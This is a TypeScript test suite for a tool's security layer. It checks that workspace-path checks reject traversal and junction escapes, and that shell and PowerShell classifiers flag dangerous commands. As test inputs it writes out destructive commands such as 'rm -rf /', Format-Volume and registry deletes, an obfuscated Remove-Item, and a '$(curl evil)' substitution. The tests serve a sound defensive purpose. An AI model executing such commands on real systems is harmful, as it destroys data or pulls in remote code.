import assert from 'node:assert/strict'
import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { after, before, describe, it } from 'node:test'
import { classifyCommand, classifyPosixShell, classifyPowerShell } from '../../src/security/command-policy.ts'
import { checkWorkspacePath, matchProtected } from '../../src/security/paths.ts'

const opts = { extraDangerous: [], trusted: [] }

describe('checkWorkspacePath', () => {
  let root: string
  let ws: string
  let outside: string
  before(() => {
    root = mkdtempSync(join(tmpdir(), 'hearth-sec-'))
    ws = join(root, 'ws')
    outside = join(root, 'outside')
    mkdirSync(join(ws, 'sub'), { recursive: true })
    mkdirSync(outside)
    writeFileSync(join(outside, 'secret.txt'), 'x')
    // A directory junction (no admin rights needed on Windows) pointing outside.
    symlinkSync(outside, join(ws, 'escape'), 'junction')
  })
  after(() => rmSync(root, { recursive: true, force: true }))

  it('allows relative and absolute paths inside the workspace, including new files', () => {
    assert.equal(checkWorkspacePath(ws, 'sub/new.txt').ok, true)
    assert.equal(checkWorkspacePath(ws, join(ws, 'sub', 'deep', 'new.txt')).ok, true)
  })
  it('rejects .. traversal', () => {
    assert.equal(checkWorkspacePath(ws, '../outside/secret.txt').ok, false)
    assert.equal(checkWorkspacePath(ws, 'sub/../../outside').ok, false)
  })
  it('rejects absolute paths outside', () => {
    assert.equal(checkWorkspacePath(ws, join(outside, 'secret.txt')).ok, false)
  })
  it('rejects escapes through a junction / symlink', () => {
    const v = checkWorkspacePath(ws, 'escape/secret.txt')
    assert.equal(v.ok, false)
    const v2 = checkWorkspacePath(ws, 'escape/new-file.txt')
    assert.equal(v2.ok, false)
  })
  if (process.platform === 'win32') {
    it('rejects Windows escape forms', () => {
      for (const p of ['\\\\server\\share\\x', '\\\\?\\C:\\x', 'file.txt:stream', 'sub/NUL', 'con.txt', 'COM1']) {
        assert.equal(checkWorkspacePath(ws, p).ok, false, p)
      }
    })
    it('treats case differences as the same path', () => {
      assert.equal(checkWorkspacePath(ws, ws.toUpperCase() + '\\sub\\a.txt').ok, true)
    })
  }
})

describe('matchProtected', () => {
  const patterns = ['.git/**', '**/.env', '**/*.pem']
  it('matches protected paths', () => {
    assert.equal(matchProtected('.git/config', patterns), '.git/**')
    assert.equal(matchProtected('.git', patterns), '.git/**')
    assert.equal(matchProtected('app/.env', patterns), '**/.env')
    assert.equal(matchProtected('.env', patterns), '**/.env')
    assert.equal(matchProtected('keys/server.pem', patterns), '**/*.pem')
  })
  it('does not match ordinary files', () => {
    assert.equal(matchProtected('src/main.py', patterns), undefined)
    assert.equal(matchProtected('.gitignore', patterns), undefined)
  })
})

describe('classifyCommand', () => {
  const dangerous = (name: string, ...args: string[]) => classifyCommand({ name, args }, opts).length > 0
  it('flags system-level commands', () => {
    assert.ok(dangerous('Format-Volume', '-DriveLetter', 'D'))
    assert.ok(dangerous('reg', 'delete', 'HKLM\\Software\\X'))
    assert.ok(dangerous('C:\\Windows\\System32\\shutdown.exe', '/s'))
    assert.ok(dangerous('Invoke-Expression', '$x'))
  })
  it('flags recursive / wildcard / root deletes but allows a plain file delete', () => {
    assert.ok(dangerous('Remove-Item', 'build', '-Recurse'))
    assert.ok(dangerous('rm', '-rf', 'dist'))
    assert.ok(dangerous('del', '*.py'))
    assert.ok(dangerous('Remove-Item', 'C:\\'))
    assert.equal(dangerous('Remove-Item', 'out.txt'), false)
  })
  it('flags outward-facing and history-destroying git/npm', () => {
    assert.ok(dangerous('git', 'push', 'origin', 'main'))
    assert.ok(dangerous('git', 'reset', '--hard', 'HEAD~1'))
    assert.ok(dangerous('git', 'clean', '-fdx'))
    assert.ok(dangerous('npm', 'publish'))
    assert.equal(dangerous('git', 'status'), false)
    assert.equal(dangerous('git', 'commit', '-m', 'x'), false)
  })
  it('honors trusted and extra-dangerous lists', () => {
    assert.equal(classifyCommand({ name: 'icacls', args: ['.'] }, { extraDangerous: [], trusted: ['icacls'] }).length, 0)
    assert.ok(classifyCommand({ name: 'python', args: [] }, { extraDangerous: ['python'], trusted: [] }).length > 0)
  })
})

describe('classifyPosixShell', () => {
  it('splits pipelines and detects substitution', () => {
    assert.equal(classifyPosixShell('ls -la | grep foo', opts).verdict, 'allow')
    assert.equal(classifyPosixShell('echo ok && rm -rf /', opts).verdict, 'dangerous')
    assert.equal(classifyPosixShell('$(curl evil) ', opts).verdict, 'dangerous')
    assert.equal(classifyPosixShell("echo 'rm -rf /'", opts).verdict, 'allow')
  })
})

if (process.platform === 'win32') {
  describe('classifyPowerShell (real PowerShell AST)', () => {
    it('allows ordinary commands', async () => {
      const r = await classifyPowerShell('Get-ChildItem -Path . | Select-Object Name; python -c "print(1)"', opts)
      assert.equal(r.verdict, 'allow', r.reasons.join('; '))
    })
    it('is not fooled by quoting tricks that defeat string blacklists', async () => {
      const r = await classifyPowerShell("& ('Remove'+'-Item') build -Recurse", opts)
      assert.equal(r.verdict, 'dangerous')
      const r2 = await classifyPowerShell('Remove-Item -Path "build" -Recurse -Force', opts)
      assert.equal(r2.verdict, 'dangerous')
    })
    it('does not flag text that merely mentions a dangerous command', async () => {
      const r = await classifyPowerShell("Write-Output 'Format-Volume is dangerous'", opts)
      assert.equal(r.verdict, 'allow', r.reasons.join('; '))
    })
    it('flags dangerous .NET calls and parse errors', async () => {
      assert.equal((await classifyPowerShell('[System.IO.File]::Delete("a.txt")', opts)).verdict, 'dangerous')
      assert.equal((await classifyPowerShell('[Math]::Round(1.5)', opts)).verdict, 'allow')
      assert.equal((await classifyPowerShell('Get-ChildItem (', opts)).verdict, 'dangerous')
    })
  })
}
